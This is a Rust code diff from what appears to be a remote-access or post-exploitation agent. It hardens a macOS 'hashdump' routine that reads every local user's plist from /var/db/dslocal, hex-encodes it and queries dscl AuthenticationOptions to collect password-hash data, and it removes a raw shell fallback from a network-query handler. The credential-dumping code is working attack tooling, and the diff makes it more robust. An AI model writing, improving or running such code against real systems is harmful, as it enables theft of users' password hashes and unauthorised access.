@@ -414,7 +414,7 @@ fn do_net(query: &str) -> Response {
         "routes" | "route" | "netstat" => ("netstat", &["-rn"][..]),
         "arp" => ("arp", &["-a"][..]),
         "connections" | "conn" => ("netstat", &["-an"][..]),
-        other => return Response::Output(run_shell_raw(other).into_bytes()),
+        other => return Response::Err(format!("net: unknown query '{other}'")),
     };
     match std::process::Command::new(cmd.0).args(cmd.1).output() {
         Ok(out) => Response::Output(out.stdout),
@@ -463,6 +463,7 @@ fn do_env(name: &str) -> Response {
 }
 
 /// 跑一个 shell 命令返回 stdout 文本（do_net 的 fallback 用）。
+#[allow(dead_code)] // no longer called after M9 fallback fix; kept for reference
 fn run_shell_raw(args: &str) -> String {
     #[cfg(unix)]
     {
@@ -568,16 +569,32 @@ fn do_hashdump(method: u8) -> Response {
                         let name_str = name.to_string_lossy();
                         if !name_str.ends_with(".plist") { continue; }
                         let user = name_str.trim_end_matches(".plist");
-                        // 用 dscl + xxd 提取 shadow hash（比直接解析二进制 plist 简单可靠）
-                        let shadow = std::process::Command::new("sh")
-                            .arg("-c")
-                            .arg(format!("dscl . -read /Users/{user} AuthenticationOptions 2>/dev/null; cat /var/db/dslocal/nodes/Default/users/{user}.plist 2>/dev/null | xxd -p | head -c 256"))
+                        // Read the plist file directly instead of shelling out (M9:
+                        // the old `sh -c` interpolated `user` into the command
+                        // string → command injection via a crafted username).
+                        let plist_path = format!("/var/db/dslocal/nodes/Default/users/{user}.plist");
+                        let plist_data = std::fs::read(&plist_path);
+                        let plist_hex = plist_data
+                            .map(|d| hex::encode(&d))
+                            .unwrap_or_default();
+                        let truncated = if plist_hex.len() > 256 {
+                            &plist_hex[..256]
+                        } else {
+                            &plist_hex
+                        };
+                        // dscl gets `user` as a separate argv element (no shell),
+                        // so an attacker-controlled username can't break out.
+                        let dscl = std::process::Command::new("dscl")
+                            .args([".", "-read", &format!("/Users/{user}"), "AuthenticationOptions"])
                             .output();
-                        if let Ok(out) = shadow {
-                            let hash_hex = String::from_utf8_lossy(&out.stdout);
-                            if !hash_hex.trim().is_empty() {
-                                results.push(format!("{user}:{hash_hex}"));
-                            }
+                        let mut combined = String::new();
+                        if let Ok(out) = dscl {
+                            combined
+                                .push_str(&String::from_utf8_lossy(&out.stdout));
+                        }
+                        combined.push_str(truncated);
+                        if !combined.trim().is_empty() {
+                            results.push(format!("{user}:{combined}"));
                         }
                     }
                 }
